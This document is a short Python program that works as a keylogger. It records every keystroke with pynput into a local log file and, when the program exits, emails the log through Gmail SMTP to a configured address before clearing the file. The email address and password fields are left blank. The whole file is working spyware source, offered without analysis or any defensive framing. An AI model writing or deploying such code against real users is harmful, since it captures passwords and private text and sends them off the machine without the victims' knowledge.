import atexit
from pynput import keyboard
import smtplib

# Email account information
EMAIL_ADDRESS = ""
# One-time Google App password for PyCharm
EMAIL_PASSWORD = ""

# text file that will store keystrokes
log_file = "key_log.txt"


# Email log function
def send_email(log_file):
    try:
        with open(log_file, "r") as f:
            log = f.read()
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, log)
        server.quit()
    except Exception as e:
        print(e)


# Keylogger function
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        if key == key.space:
            with open(log_file, "a") as f:
                f.write(" ")
        elif key == key.enter:
            with open(log_file, "a") as f:
                f.write(" Key.Enter ")
                f.write('\n')
        else:
            with open(log_file, "a") as f:
                f.write(" " + str(key) + " ")


# At program exit:
#   1. the text file will be sent to the specified email address
#   2. the text file will be cleared
@atexit.register
def on_exit():
    send_email(log_file)
    open(log_file, 'w')


# Listen for key press events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()



